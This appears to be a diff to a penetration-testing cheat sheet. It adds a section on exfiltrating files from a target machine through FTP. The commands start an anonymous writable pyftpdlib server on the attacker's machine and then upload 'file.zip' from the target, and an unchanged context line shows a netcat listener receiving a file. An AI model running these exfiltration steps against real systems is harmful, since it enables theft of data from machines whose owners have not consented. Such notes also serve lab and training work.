@@ -50,6 +50,35 @@ nc -lvnp PORT > file.zip
 ```
 
 
+### Through FTP 
+
+If we can connect with any FTP server from the machine, then we can use this method. 
+
+Run the FTP server on your own attacking machine.
+
+```bash
+python3 -m pyftpdlib -p 21 --write
+```
+
+This will start a python server on the attacking machine with anonymous login enabled and `--write` will make it writeable.
+
+From the target machine, we can connect with the above started FTP server as below:
+
+```bash
+ftp IP
+
+# Hit Enter if asked for password
+
+put file.zip 
+```
+
+This will upload the file.zip on our own attacking machine from the target machine. 
+
+
+
+
+
+
 
 
 
